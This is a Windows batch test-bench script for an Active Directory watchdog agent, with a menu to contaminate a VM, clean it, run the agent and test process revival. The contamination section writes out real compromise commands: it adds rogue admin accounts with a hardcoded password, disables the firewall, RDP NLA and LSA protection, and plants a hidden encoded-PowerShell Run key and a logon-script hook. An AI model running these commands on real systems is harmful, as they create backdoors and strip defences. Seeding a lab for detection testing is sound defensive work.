@echo off
REM ==============================================================================
REM Standalone Windows VM Test Bench: Contaminate & Clean Playbook
REM Simulates Minute-0 Active Directory Compromise on a non-DC Windows Workstation
REM Run as Administrator in PowerShell or Command Prompt
REM ==============================================================================

:: Check Administrative Privileges
net session >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [!] ERROR: Please run this script as Administrator!
    pause
    exit /b 1
)

cls
echo ==============================================================================
echo   STANDALONE WINDOWS VM: AD WATCHDOG TEST BENCH (NO DC REQUIRED)
echo ==============================================================================
echo [1] Inject Contamination (Simulate Minute-0 Breach: Rogue Admin + Disabled FW)
echo [2] Cleanse System Back to Pristine Golden State
echo [3] Run Agent in Live Debug Mode (-debug)
echo [4] Test Mutual Watchdog Kill-and-Revive (Taskkill Bravo)
echo [5] Exit
echo ==============================================================================
set /p choice="Enter choice [1-5]: "

if "%choice%"=="1" goto CONTAMINATE
if "%choice%"=="2" goto CLEAN
if "%choice%"=="3" goto DEBUG_RUN
if "%choice%"=="4" goto TEST_WATCHDOG
if "%choice%"=="5" goto EXIT
goto EXIT

:CONTAMINATE
echo.
echo [*] Injecting Mock Red-Team Contamination on Local Windows VM...
:: 1. Create Rogue Admin Account
net user adm_backdoor P@ssw0rd2026! /add >nul 2>&1
net localgroup Administrators adm_backdoor /add >nul 2>&1
echo [+] Created Rogue Admin User: adm_backdoor (Added to Administrators)

:: 2. Create Standard Backdoor Account
net user support_ghost P@ssw0rd2026! /add >nul 2>&1
echo [+] Created Rogue Backdoor User: support_ghost

:: 3. Weaken Firewall & Security Policies
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f >nul 2>&1
echo [+] Disabled Windows Firewall (EnableFirewall = 0)

:: 4. Disable RDP NLA & LSA RunAsPPL
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul 2>&1
echo [+] Disabled RDP Network Level Authentication (UserAuthentication = 0)

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f >nul 2>&1
echo [+] Disabled LSA RunAsPPL Credential Guard (RunAsPPL = 0)

:: 5. Inject Autostart Run Key & Logon Script Persistence (MITRE T1547.001 / T1037)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilBackdoor /t REG_SZ /d "powershell.exe -w hidden -enc SQBFAFgA..." /f >nul 2>&1
echo [+] Planted Rogue Autostart Key in HKLM\...\Run: EvilBackdoor
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Windows\Temp\logon_hook.bat" /f >nul 2>&1
echo [+] Planted Rogue User Logon Script: UserInitMprLogonScript

echo.
echo [✔] Contamination applied! The AD Watchdog will now detect Health Score = 0%%!
pause
goto EXIT

:CLEAN
echo.
echo [*] Restoring Standalone Windows VM to Pristine Golden State...
:: 1. Delete Rogue Accounts
net user adm_backdoor /delete >nul 2>&1
net user support_ghost /delete >nul 2>&1
echo [+] Removed rogue accounts: adm_backdoor, support_ghost

:: 2. Re-enable Firewall
powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t REG_DWORD /d 1 /f >nul 2>&1
echo [+] Re-enabled Windows Firewall (EnableFirewall = 1)

:: 3. Re-enable RDP NLA & LSA RunAsPPL
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f >nul 2>&1
echo [+] Re-enabled RDP Network Level Authentication (UserAuthentication = 1)

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f >nul 2>&1
echo [+] Re-enabled LSA RunAsPPL (RunAsPPL = 1)

:: 4. Purge Autostart Run Keys & Rogue Logon Scripts
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilBackdoor /f >nul 2>&1
echo [+] Purged Rogue Autostart Run Key: EvilBackdoor
reg delete "HKCU\Environment" /v UserInitMprLogonScript /f >nul 2>&1
echo [+] Purged Rogue Logon Script: UserInitMprLogonScript
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f >nul 2>&1
echo [+] Restored pristine Winlogon Userinit & Shell

echo.
echo [✔] System restored! Health Score will return to 100%%.
pause
goto EXIT

:DEBUG_RUN
echo.
set /p srv="Enter Central Server IP (press Enter for 127.0.0.1): "
if "%srv%"=="" set srv=127.0.0.1
echo [*] Launching agent.exe in DEBUG mode targeting http://%srv%:8000/api/ad_triage ...
if exist agent.exe (
    agent.exe -alpha -server %srv% -port 8000 -interval 300 -debug
) else (
    echo [!] agent.exe not found in current folder! Compile it first.
)
pause
goto EXIT

:TEST_WATCHDOG
echo.
echo [*] Killing agent_bravo.exe to test auto-healing persistence...
taskkill /F /IM agent_bravo.exe >nul 2>&1
echo [+] agent_bravo.exe terminated.
echo [*] Waiting 4 seconds for agent_alpha.exe to re-spawn it...
timeout /t 4 /nobreak >nul
tasklist | findstr /i "agent_bravo.exe"
if %ERRORLEVEL% EQU 0 (
    echo [✔] WATCHDOG SUCCESS: agent_bravo.exe was resurrected automatically!
) else (
    echo [!] agent_bravo.exe not found. Make sure agent_alpha.exe is running.
)
pause
goto EXIT

:EXIT
